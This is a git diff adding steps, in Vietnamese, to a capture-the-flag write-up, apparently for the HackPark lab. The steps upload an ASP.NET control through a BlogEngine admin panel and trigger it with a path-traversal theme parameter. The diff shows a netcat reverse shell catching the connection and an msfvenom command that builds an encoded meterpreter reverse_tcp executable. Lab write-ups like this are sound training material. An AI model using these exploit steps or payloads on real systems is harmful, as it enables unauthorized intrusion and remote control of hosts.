@@ -34,6 +34,51 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-16 10:41:
 
 Change IP_ATTACKER in `exploit.cs` file
 
-<img width="937" height="371" alt="image" src="https://github.com/user-attachments/assets/0e692f2d-01d1-471d-b209-477f81828b8d" />
+<img width="942" height="457" alt="image" src="https://github.com/user-attachments/assets/8c2db326-1cfa-4644-b4f4-ec408d03e4b9" />
 
+Click vao `Published posts` 
 
+<img width="1905" height="617" alt="Screenshot 2026-07-17 105716" src="https://github.com/user-attachments/assets/593ce61c-1d5d-418f-8360-da010244414c" />
+
+Click vào `Welcome to HackPark` để tải tệp `PostView.ascx` lên
+
+<img width="842" height="193" alt="Screenshot 2026-07-17 105816" src="https://github.com/user-attachments/assets/2a32bc37-53af-4653-a990-3a21f2b428ff" />
+
+<img width="575" height="371" alt="Screenshot 2026-07-17 110331" src="https://github.com/user-attachments/assets/2677c067-efce-42b1-a313-78dc65a917b6" />
+
+Gõ `nc`
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -vnlp 4445     
+listening on [any] 4445 ...
+```
+
+Thêm `?theme=../../App_Data/files` vào URL để kích hoạt
+
+<img width="587" height="96" alt="Screenshot 2026-07-17 110443" src="https://github.com/user-attachments/assets/b6908455-4194-4e02-8daa-da26be5753fc" />
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -vnlp 4445     
+listening on [any] 4445 ...
+connect to [192.168.170.150] from (UNKNOWN) [10.112.140.135] 49289
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.8 LPORT=4444 -e x86/shikata_ga_nai -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+x86/shikata_ga_nai chosen with final size 381
+Payload size: 381 bytes
+Final size of exe file: 73802 bytes
+Saved as: reverse.exe
+```
